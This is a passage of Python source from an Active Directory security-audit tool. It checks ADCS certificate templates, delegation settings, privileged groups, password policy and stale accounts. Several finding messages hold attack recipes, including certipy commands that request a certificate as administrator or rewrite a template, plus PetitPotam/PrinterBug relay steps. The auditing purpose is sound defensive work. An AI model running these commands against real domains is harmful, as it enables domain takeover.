    _CT_PEND_ALL_REQUESTS = 0x00000002   # manager approval required

    def _a_adcs_checks(self):
        if self.args.no_adcs:
            return

        # ESC8: HTTP enrollment (relay-able)
        for svc in self.d.enrollment_svcs:
            host = get_str(svc["attrs"], "dNSHostName")
            if host and check_port(host, 80, timeout=3):
                self._add("A-CertEnrollHttp",
                          f"ADCS enrollment service '{get_str(svc['attrs'],'cn')}' on {host} "
                          "appears to accept HTTP (port 80 open). ESC8 NTLM relay to ADCS is "
                          "possible — use PetitPotam/PrinterBug to coerce DC auth and relay "
                          "to /certsrv/certfnsh.asp to obtain a DC certificate.",
                          [host])

        published = getattr(self.d, "_published_templates", set())

        for tmpl in self.d.cert_templates:
            cn         = get_str(tmpl["attrs"], "cn")
            name_flag  = get_int(tmpl["attrs"], "msPKI-Certificate-Name-Flag")
            enroll_flag= get_int(tmpl["attrs"], "msPKI-Enrollment-Flag")
            ra_sig     = get_int(tmpl["attrs"], "msPKI-RA-Signature")
            ekus       = get_list(tmpl["attrs"], "pKIExtendedKeyUsage")

            # Only check templates published to at least one CA
            if published and cn not in published:
                continue

            manager_approval = bool(enroll_flag & self._CT_PEND_ALL_REQUESTS)
            has_auth_eku     = bool(set(ekus) & self._AUTH_EKUS)
            has_any_eku      = self._ANY_PURPOSE_OID in ekus
            no_eku           = not ekus

            # ESC1: enrollee supplies subject + auth EKU + no manager approval
            if (name_flag & self._CT_ENROLLEE_SUPPLIES_SUBJECT
                    and has_auth_eku
                    and not manager_approval):
                ca_names = [get_str(s["attrs"],"cn") for s in self.d.enrollment_svcs
                            if cn in get_list(s["attrs"],"certificateTemplates")]
                self._add("A-CertTempCustomSubject",
                          f"ESC1: Template '{cn}' allows enrollee-supplied Subject/SAN "
                          f"with authentication EKU and no manager approval. Published on CA(s): "
                          f"{', '.join(ca_names) or 'unknown'}. "
                          "Attack: request cert with arbitrary UPN (e.g., Domain Admin) and "
                          "use PKINIT to obtain a TGT. "
                          "certipy find -vulnerable / req -template <tmpl> -upn administrator@domain",
                          [cn] + ca_names)

            # ESC2: any purpose EKU (no EKU restriction) + no manager approval
            if (has_any_eku or no_eku) and not manager_approval:
                ca_names = [get_str(s["attrs"],"cn") for s in self.d.enrollment_svcs
                            if cn in get_list(s["attrs"],"certificateTemplates")]
                self._add("A-CertTempAnyPurpose",
                          f"ESC2: Template '{cn}' has Any Purpose EKU or no EKU restrictions "
                          f"and no manager approval. Published on: {', '.join(ca_names) or 'unknown'}. "
                          "Can be used as an enrollment agent or to authenticate as any user.",
                          [cn])

            # ESC3: Certificate Request Agent EKU without RA signature
            if self._CERT_REQUEST_AGENT in ekus and ra_sig == 0 and not manager_approval:
                ca_names = [get_str(s["attrs"],"cn") for s in self.d.enrollment_svcs
                            if cn in get_list(s["attrs"],"certificateTemplates")]
                self._add("A-CertTempAgent",
                          f"ESC3: Template '{cn}' has Certificate Request Agent EKU with no "
                          f"RA signature requirement. Published on: {', '.join(ca_names) or 'unknown'}. "
                          "Allows enrolling on behalf of any user — combine with ESC2 template "
                          "to impersonate Domain Admin.",
                          [cn])

            # ESC4: a low-privileged principal can EDIT the template's ACL/config
            esc4 = self._esc4_template_writers(tmpl)
            if esc4:
                self._add("A-CertTemplateESC4",
                          f"ESC4: Template '{cn}' is writable by low-privileged "
                          f"principal(s): {', '.join(esc4)}. They can reconfigure it "
                          "into an ESC1 (enrollee-supplied SAN + auth EKU) and then "
                          "impersonate any user. certipy template -template "
                          f"{cn} ... to weaponise.",
                          [f"{cn} writable by {p}" for p in esc4])

    # Access-mask bits that let a principal rewrite a template into ESC1.
    _ADS_GENERIC_ALL   = 0x10000000
    _ADS_GENERIC_WRITE = 0x40000000
    _ADS_WRITE_DACL    = 0x00040000
    _ADS_WRITE_OWNER   = 0x00080000
    _ADS_WRITE_PROP    = 0x00000020

    def _broad_low_priv_sids(self) -> Dict[str, str]:
        """Well-known SIDs that represent 'any/most authenticated principals'."""
        if getattr(self, "_broad_sids_cache", None) is not None:
            return self._broad_sids_cache
        sids = {"S-1-1-0": "Everyone", "S-1-5-11": "Authenticated Users",
                "S-1-5-7": "Anonymous", "S-1-5-32-545": "Users"}  # BUILTIN\Users
        try:
            dsid = sid_to_str(self.d.domain_obj["attrs"].get("objectSid"))
            if isinstance(self.d.domain_obj["attrs"].get("objectSid"), list):
                dsid = sid_to_str(self.d.domain_obj["attrs"]["objectSid"][0])
            if dsid.startswith("S-1-5-21"):
                sids[f"{dsid}-513"] = "Domain Users"
                sids[f"{dsid}-515"] = "Domain Computers"
        except Exception:
            pass
        self._broad_sids_cache = sids
        return sids

    def _esc4_template_writers(self, tmpl: Dict) -> List[str]:
        if not HAS_IMPACKET_LDAP:
            return []
        raw = tmpl["attrs"].get("nTSecurityDescriptor")
        if isinstance(raw, list):
            raw = raw[0] if raw else None
        if not raw:
            return []
        if not isinstance(raw, (bytes, bytearray)):
            return []
        try:
            sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw)
        except Exception:
            return []
        broad = self._broad_low_priv_sids()
        dangerous = (self._ADS_GENERIC_ALL | self._ADS_GENERIC_WRITE
                     | self._ADS_WRITE_DACL | self._ADS_WRITE_OWNER
                     | self._ADS_WRITE_PROP)
        writers: List[str] = []
        dacl = sd.get("Dacl")
        if not dacl:
            return []
        for ace in dacl["Data"]:
            try:
                if ace["AceType"] not in (0x00, 0x05):  # ALLOWED / ALLOWED_OBJECT
                    continue
                mask = int(ace["Ace"]["Mask"]["Mask"])
                sidstr = ace["Ace"]["Sid"].formatCanonical()
            except Exception:
                continue
            if sidstr in broad and (mask & dangerous):
                writers.append(broad[sidstr])
        return _dedup_keep_order(writers)

    def _a_member_everyone(self):
        everyone_patterns = ["everyone","s-1-1-0","authenticated users",
                             "s-1-5-11","anonymous","s-1-5-7"]
        for gname in self.PRIV_GROUPS_SENSITIVE:
            g = self.d.groups.get(gname.lower())
            if not g:
                continue
            for m in get_list(g["attrs"], "member"):
                ml = m.lower()
                if any(p in ml for p in everyone_patterns):
                    self._add("A-MembershipEveryone",
                              f"'{m}' is a member of privileged group '{gname}'. "
                              "Any domain user (or anonymous) inherits these privileges.",
                              [f"{m} -> {gname}"])

    PRIV_GROUPS_SENSITIVE = [
        "Domain Admins","Schema Admins","Enterprise Admins","Administrators",
        "Group Policy Creator Owners","Backup Operators","Account Operators",
    ]

    def _a_bad_successor(self):
        # Check for dMSA objects with msDS-DelegatedManagedServiceAccountPrecededByLink
        # indicating a bad-successor configuration
        dmsas = self.d.conn.paged_search(
            self.d.base,
            "(objectClass=msDS-DelegatedManagedServiceAccount)",
            ["cn","msDS-ManagedAccountPrecededByLink",
             "msDS-DelegatedManagedServiceAccountPrecededByLink",
             "distinguishedName"])
        for dmsa in dmsas:
            link = get_str(dmsa["attrs"],
                           "msDS-DelegatedManagedServiceAccountPrecededByLink") or \
                   get_str(dmsa["attrs"], "msDS-ManagedAccountPrecededByLink")
            if link:
                self._add("A-BadSuccessor",
                          f"dMSA '{dmsa['dn']}' has a predecessor link to '{link}'. "
                          "An attacker with delegation rights can extract the predecessor's "
                          "password hash or forge memberships.",
                          [dmsa["dn"]])

    def _a_dc_spooler_webclient(self):
        """Probe DC TCP/445 + RPC endpoint mapper for spoolsv. We only emit a
        finding when we can actively confirm an exploitable surface — no
        more 'cannot determine via LDAP' boilerplate.
        """
        if not HAS_IMPACKET_SMB:
            return
        try:
            from impacket.dcerpc.v5 import transport, epm  # noqa: F401
        except ImportError:
            return
        # MS-RPRN UUID (Print System Remote Protocol)
        RPRN_UUID = ('12345678-1234-ABCD-EF00-0123456789AB', '1.0')
        coercible: List[str] = []
        for dc in self.d.dcs[:8]:
            host = get_str(dc["attrs"], "dNSHostName") or \
                   get_str(dc["attrs"], "sAMAccountName")
            if not host:
                continue
            if not check_port(self.args.dc_ip, 445, timeout=3):
                continue
            try:
                strbind = epm.hept_map(self.args.dc_ip,
                                       RPRN_UUID[0],
                                       protocol="ncacn_ip_tcp")
                if strbind:
                    coercible.append(host)
            except Exception:
                continue
        if coercible:
            self._add("A-DC-Coerce",
                      "Print System Remote Protocol (MS-RPRN / spoolsv) is reachable on the "
                      "domain controller(s). Combined with NTLM relay this enables PrinterBug / "
                      "PetitPotam-style coercion to mint a DC certificate or relay to LDAPS.",
                      coercible)

    def _a_smart_card_rotation(self):
        # msDS-ExpirePasswordsOnSmartCardOnlyAccounts should be set
        if self.d.domain_obj:
            attrs = self.d.domain_obj["attrs"]
            flag_raw = attrs.get("msDS-ExpirePasswordsOnSmartCardOnlyAccounts")
            # Attribute may not exist on older domains
            if flag_raw is not None and str(flag_raw).upper() not in ("TRUE","1"):
                self._add("A-SmartCardPwdRotation",
                          "msDS-ExpirePasswordsOnSmartCardOnlyAccounts is not set. "
                          "Smart-card-only accounts' NT hashes never rotate.",
                          [])

    def _a_admin_sd_holder(self):
        # Check AdminSDHolder ACL for dangerous principals
        # Full ACL parse is complex; we flag that it exists for review
        if self.d.admin_sd_holder:
            # Check if there are non-admin users with high priv group membership
            # that differ from AdminSDHolder ACL - partial check via adminCount
            ac1_users = [u for u in self.d.users
                         if get_int(u["attrs"], "adminCount") == 1]
            # Users with adminCount=1 but not in any known priv group = orphaned
            known_priv_dns = set()
            for grp_members in self.d.priv_group_members.values():
                for m in grp_members:
                    known_priv_dns.add(m.get("dn", "").lower())
            orphaned = []
            for u in ac1_users:
                if u["dn"].lower() not in known_priv_dns:
                    sam = get_str(u["attrs"], "sAMAccountName")
                    uac = get_int(u["attrs"], "userAccountControl")
                    if not uac_has(uac, UAC_ACCOUNTDISABLE):
                        orphaned.append(sam)
            if orphaned:
                self._add("A-AdminSDHolder",
                          f"{len(orphaned)} account(s) have adminCount=1 but are not members "
                          "of any known privileged group — possible orphaned AdminSDHolder entries.",
                          orphaned[:20])

    def _a_pwd_gpo(self):
        if not self.d.domain_obj:
            return
        attrs = self.d.domain_obj["attrs"]
        props = get_int(attrs, "pwdProperties")
        hist  = get_int(attrs, "pwdHistoryLength")
        # pwdProperties bit 0 (0x1) = DOMAIN_PASSWORD_COMPLEX
        if not (props & 0x1):
            self._add("A-PwdComplexity",
                      "Domain default password policy does not require complexity "
                      f"(pwdProperties=0x{props:x}; DOMAIN_PASSWORD_COMPLEX bit clear).",
                      [f"pwdProperties=0x{props:x}"])
        if hist > 0 and hist < 24:
            self._add("A-PwdHistory",
                      f"Domain password history length is {hist} entries "
                      "(recommended ≥ 24).",
                      [f"pwdHistoryLength={hist}"])
        # maxPwdAge is stored as negative 100-ns FILETIME. 0 or 0x8000000000000000 = never expire.
        mpa_raw = attrs.get("maxPwdAge")
        try:
            mpa_int = int(mpa_raw[0] if isinstance(mpa_raw, list) else mpa_raw)
        except (TypeError, ValueError):
            mpa_int = 0
        # Convert to days. Anything == 0 or == -0x8000000000000000 -> never
        if mpa_int == 0 or mpa_int == -0x8000000000000000:
            self._add("A-PwdMaxAge",
                      "Domain maxPwdAge is set to NEVER — credentials never expire by policy.",
                      ["maxPwdAge = never"])
        else:
            days = abs(mpa_int) / (10_000_000 * 60 * 60 * 24)
            if days > 365:
                self._add("A-PwdMaxAge",
                          f"Domain password maximum age is {days:.0f} days "
                          "(recommended ≤ 365).",
                          [f"maxPwdAge ≈ {days:.0f} days"])

    def _a_audit_powershell(self):
        """No-op: the LDAP-only path cannot read Registry.pol. The matching
        GPO-aware check (_a_powershell_logging_gpo) runs during SYSVOL pass
        and emits a fact-based finding when evidence is present."""
        return

    # =========================================================================
    # PRIVILEGED CHECKS (P-)
    # =========================================================================

    def _check_privileged(self):
        self._p_admin_count()
        self._p_admin_pwd_age()
        self._p_inactive_admins()
        self._p_kerberoasting_priv()
        self._p_unconstrained_delegation()
        self._p_service_domain_admin()
        self._p_schema_admin()
        self._p_recycle_bin()
        self._p_protected_users_priv()
        self._p_rodc_checks()
        self._p_dns_admin()
        self._p_exchange_priv_esc()
        self._p_delegations()
        self._p_unprotected_ous()
        self._p_everyone_privs()

    def _p_admin_count(self):
        da = self.d.priv_group_members.get("Domain Admins", [])
        active_admins = [m for m in da
                         if not uac_has(get_int(m["attrs"],"userAccountControl"),
                                        UAC_ACCOUNTDISABLE)]
        threshold = 5
        if len(active_admins) > threshold:
            names = [get_str(m["attrs"],"sAMAccountName") for m in active_admins]
            self._add("P-AdminNum",
                      f"{len(active_admins)} active Domain Admin accounts found "
                      f"(recommended ≤ {threshold}). Reduce attack surface.",
                      names[:30])
        # Check for admins that have never logged in
        never_logon = []
        for m in active_admins:
            llt = get_int(m["attrs"], "lastLogonTimestamp")
            if llt == 0:
                never_logon.append(get_str(m["attrs"], "sAMAccountName"))
        if never_logon:
            self._add("P-AdminLogin",
                      f"{len(never_logon)} Domain Admin account(s) have never logged in.",
                      never_logon)
        # Email on admin accounts
        with_mail = [get_str(m["attrs"],"sAMAccountName") for m in active_admins
                     if get_str(m["attrs"],"mail")]
        if with_mail:
            self._add("P-AdminEmailOn",
                      f"{len(with_mail)} admin account(s) have email attributes — "
                      "increases phishing/enumeration risk.",
                      with_mail[:20])

    def _p_admin_pwd_age(self):
        for grpname in ["Domain Admins","Administrators","Enterprise Admins"]:
            for m in self.d.priv_group_members.get(grpname, []):
                uac = get_int(m["attrs"], "userAccountControl")
                if uac_has(uac, UAC_ACCOUNTDISABLE):
                    continue
                pls = filetime_to_dt(get_int(m["attrs"], "pwdLastSet"))
                age = days_since(pls)
                if age is None or age > 90:
                    sam = get_str(m["attrs"], "sAMAccountName")
                    age_str = f"{age} days" if age is not None else "NEVER"
                    self._add("P-AdminPwdTooOld",
                              f"{sam} ({grpname}): password last set {age_str} ago.",
                              [sam])

    def _p_inactive_admins(self):
        affected = []
        for grpname in ["Domain Admins","Enterprise Admins","Administrators"]:
            for m in self.d.priv_group_members.get(grpname, []):
                uac = get_int(m["attrs"], "userAccountControl")
                if uac_has(uac, UAC_ACCOUNTDISABLE):
                    continue
                llt = filetime_to_dt(get_int(m["attrs"], "lastLogonTimestamp"))
                age = days_since(llt)
                if age is None or age > 180:
                    sam = get_str(m["attrs"], "sAMAccountName")
                    age_str = f"{age} days" if age is not None else "NEVER"
                    affected.append(f"{sam} (last logon: {age_str})")
        if affected:
            self._add("P-Inactive",
                      f"{len(affected)} privileged account(s) inactive for >180 days.",
                      affected[:20])

    def _p_kerberoasting_priv(self):
        affected = []
        for grpname in ["Domain Admins","Enterprise Admins","Schema Admins"]:
            for m in self.d.priv_group_members.get(grpname, []):
                uac = get_int(m["attrs"], "userAccountControl")
                if uac_has(uac, UAC_ACCOUNTDISABLE):
                    continue
                spns = get_list(m["attrs"], "servicePrincipalName")
                if spns:
                    sam = get_str(m["attrs"], "sAMAccountName")
                    affected.append(f"{sam}: {', '.join(spns[:3])}")
        if affected:
            self._add("P-Kerberoasting",
                      f"{len(affected)} privileged account(s) have SPNs — "
                      "Kerberoasting can reveal their passwords offline.",
                      affected[:20])

    def _p_unconstrained_delegation(self):
        affected = []
        for comp in self.d.computers:
            uac = get_int(comp["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_SERVER_TRUST):
                continue  # DCs are expected to have this
            if uac_has(uac, UAC_TRUSTED_FOR_DELEGATION):
                sam = get_str(comp["attrs"], "sAMAccountName")
                affected.append(sam)
        for user in self.d.users:
            uac = get_int(user["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_TRUSTED_FOR_DELEGATION):
                sam = get_str(user["attrs"], "sAMAccountName")
                affected.append(sam)
        if affected:
            self._add("P-UnconstrainedDelegation",
                      f"{len(affected)} non-DC account(s) have unconstrained Kerberos delegation. "
                      "Compromise of these accounts allows impersonating any user to any service.",
                      affected[:30])

    def _p_service_domain_admin(self):
        da_dns = {m.get("dn","").lower()
                  for m in self.d.priv_group_members.get("Domain Admins",[])}
        affected = []
        for user in self.d.users:
            uac = get_int(user["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            spns = get_list(user["attrs"], "servicePrincipalName")
            if spns and user["dn"].lower() in da_dns:
                sam = get_str(user["attrs"], "sAMAccountName")
                affected.append(sam)
        if affected:
            self._add("P-ServiceDomainAdmin",
                      f"{len(affected)} service account(s) with SPN are members of Domain Admins.",
                      affected[:20])

    def _p_schema_admin(self):
        sa = self.d.priv_group_members.get("Schema Admins", [])
        active = [get_str(m["attrs"],"sAMAccountName") for m in sa
                  if not uac_has(get_int(m["attrs"],"userAccountControl"),UAC_ACCOUNTDISABLE)]
        if active:
            self._add("P-SchemaAdmin",
                      f"Schema Admins group has {len(active)} active member(s). "
                      "This group should be empty when schema changes are not in progress.",
                      active[:20])

    def _p_recycle_bin(self):
        # Check for AD Recycle Bin optional feature
        rb = self.d.conn.search_one(
            f"CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,{self.d.cfg}",
            "(cn=Recycle Bin Feature)",
            ["msDS-EnabledFeature","distinguishedName"])
        # If not found or enabledScopes list is empty, Recycle Bin is not enabled
        enabled = False
        if rb:
            enabled_scopes = get_list(rb["attrs"], "msDS-EnabledFeature")
            enabled = len(enabled_scopes) > 0
        if not enabled:
            self._add("P-RecycleBin",
                      "AD Recycle Bin is not enabled — deleted objects cannot be recovered "
                      "and attackers can hide tracks more easily.",
                      [])

    def _p_protected_users_priv(self):
        pu = self.d.protected_users
        if not pu:
            return
        pu_dns = {m.lower() for m in get_list(pu["attrs"], "member")}
        not_in = []
        for grpname in ["Domain Admins","Enterprise Admins","Schema Admins"]:
            for m in self.d.priv_group_members.get(grpname, []):
                uac = get_int(m["attrs"], "userAccountControl")
                if uac_has(uac, UAC_ACCOUNTDISABLE):
                    continue
                if m.get("dn","").lower() not in pu_dns:
                    sam = get_str(m["attrs"], "sAMAccountName")
                    not_in.append(f"{sam} ({grpname})")
        if not_in:
            self._add("P-ProtectedUsers",
                      f"{len(not_in)} privileged account(s) not in Protected Users group. "
                      "They are vulnerable to NTLM relay and credential theft.",
                      not_in[:20])

    def _p_rodc_checks(self):
        for rodc in self.d.dcs:
            if not get_str(rodc["attrs"], "msDS-IsRODC", "").upper() in ("TRUE","1"):
                continue
            dn = rodc["dn"]
            # Check NeverRevealGroup
            never_reveal = get_list(rodc["attrs"], "msDS-NeverRevealGroup")
            if not never_reveal:
                self._add("P-RODCNeverReveal",
                          f"RODC '{dn}' has no msDS-NeverRevealGroup configured.",
                          [dn])
            # Check RevealedUsers for privileged accounts
            revealed = get_list(rodc["attrs"], "msDS-RevealedUsers")
            da_dns_lower = {m.get("dn","").lower()
                            for m in self.d.priv_group_members.get("Domain Admins",[])}
            for r in revealed:
                if r.lower() in da_dns_lower:
                    self._add("P-RODCAdminRevealed",
                              f"Privileged account '{r}' credentials have been "
                              f"revealed/cached on RODC '{dn}'.",
                              [dn, r])

    def _p_dns_admin(self):
        dns_members = self.d.priv_group_members.get("DNSAdmins",
                      self.d.priv_group_members.get("DnsAdmins", []))
        active = [get_str(m["attrs"],"sAMAccountName") for m in dns_members
                  if not uac_has(get_int(m["attrs"],"userAccountControl"),UAC_ACCOUNTDISABLE)]
        if active:
            self._add("P-DNSAdmin",
                      f"DNSAdmins group has {len(active)} member(s). "
                      "Members can load arbitrary DLLs into the DNS service on DCs.",
                      active[:20])

    def _p_exchange_priv_esc(self):
        # Check for Exchange Windows Permissions having WriteDACL on domain root
        # This is the classic Exchange PrivEsc (CVE-2019-0686 style)
        ewp = self.d.priv_group_members.get("Exchange Windows Permissions", [])
        if ewp:
            self._add("P-ExchangePrivEsc",
                      f"'Exchange Windows Permissions' group has {len(ewp)} member(s). "
                      "If this group has WriteDACL on the domain object, DCSync is possible. "
                      "Verify ACL on domain root.",
                      [get_str(m["attrs"],"sAMAccountName") for m in ewp[:10]])

    def _p_delegations(self):
        # Constrained delegation with protocol transition (T2A4D)
        for user in self.d.users:
            uac = get_int(user["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_TRUSTED_TO_AUTH):
                sam = get_str(user["attrs"], "sAMAccountName")
                self._add("P-DelegationDCt2a4d",
                          f"User '{sam}' has TRUSTED_TO_AUTH_FOR_DELEGATION (protocol transition). "
                          "This allows the account to impersonate any user to constrained services.",
                          [sam])
        for comp in self.d.computers:
            uac = get_int(comp["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_TRUSTED_TO_AUTH):
                sam = get_str(comp["attrs"], "sAMAccountName")
                self._add("P-DelegationDCt2a4d",
                          f"Computer '{sam}' has TRUSTED_TO_AUTH_FOR_DELEGATION.",
                          [sam])

    def _p_unprotected_ous(self):
        """Look for OUs that lack the accidental-deletion DENY ACE.

        Deletion protection is implemented as a DENY ACE for Everyone
        (S-1-1-0) covering ADS_RIGHT_DS_DELETE_CHILD | DELETE on the OU.
        We only flag OUs that contain DCs or top-level OUs and that are
        actually missing that ACE — no more blanket flags."""
        if not HAS_IMPACKET_LDAP:
            return
        ous = self.d.conn.paged_search(
            self.d.base,
            "(objectClass=organizationalUnit)",
            ["distinguishedName","name","isCriticalSystemObject"])
        EVERYONE_SID = "S-1-1-0"
        # ADS_RIGHT_DS_DELETE_CHILD = 0x40, DELETE = 0x10000
        DEL_MASK = 0x40 | 0x10000
        unprotected: List[str] = []
        for ou in ous:
            dn = ou["dn"]
            # Restrict to top-level OUs and Domain Controllers OU
            parts = [p for p in dn.split(",") if p.strip().upper().startswith("OU=")]
            is_dc_ou = parts and parts[0].strip().upper() == "OU=DOMAIN CONTROLLERS"
            if not (len(parts) == 1 or is_dc_ou):
                continue
            try:
                ctl = security_descriptor_control(sdflags=0x07)
                self.d.conn.conn.search(dn, "(objectClass=*)",
                    attributes=["nTSecurityDescriptor"], controls=ctl)
                entries = self.d.conn.conn.entries
                if not entries:
                    continue
                sd_raw = entries[0]["nTSecurityDescriptor"].raw_values
                if not sd_raw:
                    continue
                sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_raw[0])
                dacl = sd["Dacl"]
                if not dacl:
                    continue
                has_deny = False
                for ace in dacl["Data"]:
                    ace_type = ace["AceType"]
                    # 0x1 = ACCESS_DENIED_ACE_TYPE
                    if ace_type != 0x1:
                        continue
                    sid = ace["Ace"]["Sid"].formatCanonical()
                    if sid != EVERYONE_SID:
                        continue
                    mask = ace["Ace"]["Mask"]["Mask"]
                    if mask & DEL_MASK:
                        has_deny = True
                        break
                if not has_deny:
                    unprotected.append(get_str(ou["attrs"], "name") or dn)
            except Exception:
                continue
        if unprotected:
            self._add("P-UnprotectedOU",
                      f"{len(unprotected)} OU(s) missing the 'Protect object from "
                      "accidental deletion' DENY ACE for Everyone. An attacker (or "
                      "scripted misclick) with delete rights can drop the OU and all "
                      "its child objects.",
                      unprotected)

    def _p_everyone_privs(self):
        # Check if User Rights Assignment GPO grants sensitive privs to Everyone
        # Can't read GPO content without SMB; flag for review
        pass

    # =========================================================================
    # STALE CHECKS (S-)
    # =========================================================================

    def _check_stale(self):
        self._s_inactive_users()
        self._s_inactive_computers()
        self._s_inactive_dcs()
        self._s_dc_not_updated()
        self._s_pwd_never_expires()
        self._s_pwd_not_required()
        self._s_des_enabled()
        self._s_no_preauth()
        self._s_sid_history()
        self._s_pwd_last_set()
        self._s_functional_level()
        self._s_old_os()
        self._s_duplicates()
        self._s_domain_dollar()
        self._s_aes_not_enabled()
        self._s_primary_group()
        self._s_kerberos_armoring()
        self._s_wsus_gpo()
        self._s_ms14_068()
        self._s_dc_subnet_missing()

    def _s_inactive_users(self):
        threshold = 180
        inactive = []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_SERVER_TRUST) or uac_has(uac, UAC_WORKSTATION_TRUST):
                continue
            llt = filetime_to_dt(get_int(u["attrs"], "lastLogonTimestamp"))
            age = days_since(llt)
            if age is None or age > threshold:
                sam = get_str(u["attrs"], "sAMAccountName")
                age_str = f"{age}d" if age is not None else "never"
                inactive.append(f"{sam} ({age_str})")
        if inactive:
            self._add("S-Inactive",
                      f"{len(inactive)} enabled user account(s) have not logged in for "
                      f">{threshold} days.",
                      inactive[:30])

    def _s_inactive_computers(self):
        threshold = 45
        inactive = []
        for comp in self.d.computers:
            uac = get_int(comp["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_SERVER_TRUST):
                continue  # DCs handled separately
            llt = filetime_to_dt(get_int(comp["attrs"], "lastLogonTimestamp"))
            age = days_since(llt)
            if age is None or age > threshold:
                name = get_str(comp["attrs"], "sAMAccountName")
                inactive.append(name)
        if inactive:
            self._add("S-C-Inactive",
                      f"{len(inactive)} computer account(s) have not authenticated in "
                      f">{threshold} days.",
                      inactive[:30])

    def _s_inactive_dcs(self):
        # lastLogonTimestamp has up to 14-day replication jitter; use 60-day threshold.
        # Do NOT flag if the timestamp is absent/zero — that just means it was never
        # replicated (common on older DCs or freshly promoted ones).
        for dc in self.d.dcs:
            uac = get_int(dc["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            llt_raw = get_int(dc["attrs"], "lastLogonTimestamp")
            if not llt_raw:
                continue   # no timestamp available — not flaggable
            llt = filetime_to_dt(llt_raw)
            age = days_since(llt)
            if age is not None and age > 60:
                name = get_str(dc["attrs"], "dNSHostName") or \
                       get_str(dc["attrs"], "sAMAccountName")
                self._add("S-DC-Inactive",
                          f"Domain controller '{name}' last authentication recorded "
                          f"{age} days ago (threshold 60 days, accounting for replication jitter). "
                          "Verify this DC is still online and replicating.",
                          [name])

    def _s_dc_not_updated(self):
        # DC machine account passwords auto-rotate every 30 days by default.
        # Flag if > 60 days to avoid false positives from slight timing differences.
        for dc in self.d.dcs:
            uac = get_int(dc["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            pls_raw = get_int(dc["attrs"], "pwdLastSet")
            if not pls_raw:
                continue
            pls = filetime_to_dt(pls_raw)
            age = days_since(pls)
            if age is not None and age > 60:
                name = get_str(dc["attrs"], "dNSHostName") or \
                       get_str(dc["attrs"], "sAMAccountName")
                self._add("S-DC-NotUpdated",
                          f"DC '{name}' machine account password last set {age} days ago. "
                          "Default auto-rotation is 30 days. This may indicate the Netlogon "
                          "secure channel is broken or machine password negotiation is disabled.",
                          [name])

    def _s_pwd_never_expires(self):
        affected = []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_DONT_EXPIRE_PASSWORD):
                sam = get_str(u["attrs"], "sAMAccountName")
                affected.append(sam)
        if affected:
            self._add("S-PwdNeverExpires",
                      f"{len(affected)} enabled account(s) have 'Password Never Expires' set.",
                      affected[:30])

    def _s_pwd_not_required(self):
        affected = []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_PASSWD_NOTREQD):
                sam = get_str(u["attrs"], "sAMAccountName")
                affected.append(sam)
        if affected:
            self._add("S-PwdNotRequired",
                      f"{len(affected)} enabled account(s) have PASSWD_NOTREQD — "
                      "they may authenticate with an empty password.",
                      affected[:30])

    def _s_des_enabled(self):
        affected = []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_USE_DES_KEY_ONLY):
                sam = get_str(u["attrs"], "sAMAccountName")
                affected.append(sam)
        if affected:
            self._add("S-DesEnabled",
                      f"{len(affected)} account(s) have USE_DES_KEY_ONLY set — "
                      "DES is broken and must not be used for Kerberos.",
                      affected[:30])

    def _s_no_preauth(self):
        admin_no_preauth = []
        normal_no_preauth = []
        da_dns = {m.get("dn","").lower()
                  for grp in ["Domain Admins","Enterprise Admins","Administrators"]
                  for m in self.d.priv_group_members.get(grp, [])}
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_DONT_REQUIRE_PREAUTH):
                sam = get_str(u["attrs"], "sAMAccountName")
                if u["dn"].lower() in da_dns:
                    admin_no_preauth.append(sam)
                else:
                    normal_no_preauth.append(sam)
        if admin_no_preauth:
            self._add("S-NoPreAuthAdmin",
                      f"{len(admin_no_preauth)} ADMIN account(s) have "
                      "DONT_REQUIRE_PREAUTH — AS-REP roastable, CRITICAL.",
                      admin_no_preauth[:20])
        if normal_no_preauth:
            self._add("S-NoPreAuth",
                      f"{len(normal_no_preauth)} user account(s) have "
                      "DONT_REQUIRE_PREAUTH — AS-REP roastable.",
                      normal_no_preauth[:30])

    def _s_sid_history(self):
        affected = []
        for u in self.d.users + self.d.computers:
            sids = get_list(u["attrs"], "sIDHistory")
            if sids:
                sam = get_str(u["attrs"], "sAMAccountName")
                affected.append(f"{sam}: {', '.join(str(s) for s in sids[:3])}")
        if affected:
            self._add("S-SIDHistory",
                      f"{len(affected)} object(s) have sIDHistory set — "
                      "these can be used to escalate privileges if SID filtering is not active.",
                      affected[:20])

    def _s_pwd_last_set(self):
        old_45, old_90, dc_old, cluster_old = [], [], [], []
        for u in self.d.users:
            uac = get_int(u["attrs"], "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if uac_has(uac, UAC_DONT_EXPIRE_PASSWORD):
                continue
            pls = filetime_to_dt(get_int(u["attrs"], "pwdLastSet"))
            age = days_since(pls)
            if age is None:
                continue
